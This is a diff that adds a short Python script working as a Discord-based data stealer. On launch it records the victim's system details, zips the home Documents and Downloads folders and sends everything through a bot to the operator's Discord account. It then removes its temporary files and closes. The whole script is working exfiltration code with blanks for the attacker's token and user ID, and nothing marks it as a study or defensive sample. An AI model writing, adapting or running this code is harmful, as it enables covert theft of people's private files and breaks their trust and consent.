@@ -1,0 +1,63 @@
+bot_token = '' # Use your own bot token
+bot_master = '' # Use your own user ID
+
+import subprocess
+try:
+    import discord
+except ImportError:
+    subprocess.run('pip install discord')
+    import discord
+try:
+    import platform
+except ImportError:
+    subprocess.run('pip install platform')
+    import platform
+try:
+    import json
+except ImportError:
+    subprocess.run('pip install json')
+    import json
+
+intents = discord.Intents.default()
+intents.message_content = True
+client = discord.Client(intents=intents)
+
+async def get_system_info(master, user):
+    info = {}
+    info['platform'] = platform.system()
+    info['platform-release'] = platform.release()
+    info['platform-version'] = platform.version()
+    info['architecture'] = platform.machine()
+    info['processor'] = platform.processor()
+    with open(f'{user}_info.json', 'w') as f:
+        json.dump(info, f)
+
+    try:
+        await master.send(file=discord.File(f'{user}_info.json'))
+    except Exception as e:
+        await master.send(f'Error sending {user} system info')
+    
+    subprocess.run(['rm', f'{user}_info.json'])
+
+async def upload_file(master, user, directory):
+    subprocess.run(['zip', '-r', f'{user}_{directory}.zip', f'/home/{user}/{directory}'], stdout=subprocess.DEVNULL)
+    try:
+        await master.send(file=discord.File(f'{user}_{directory}.zip'))
+    except Exception as e:
+        await master.send(f'Error sending {user}_{directory}')
+        if 'Payload Too Large' in str(e):
+            await master.send(f'{user}_{directory} too large')
+
+    subprocess.run(['rm', f'{user}_{directory}.zip'])
+
+@client.event
+async def on_ready():
+    master = await client.fetch_user(bot_master)
+    user = subprocess.getoutput('whoami')
+    await get_system_info(master, user)
+    await upload_file(master, user, 'Documents')
+    await upload_file(master, user, 'Downloads')
+    await client.close()
+
+client.run(bot_token, log_handler=None)
+
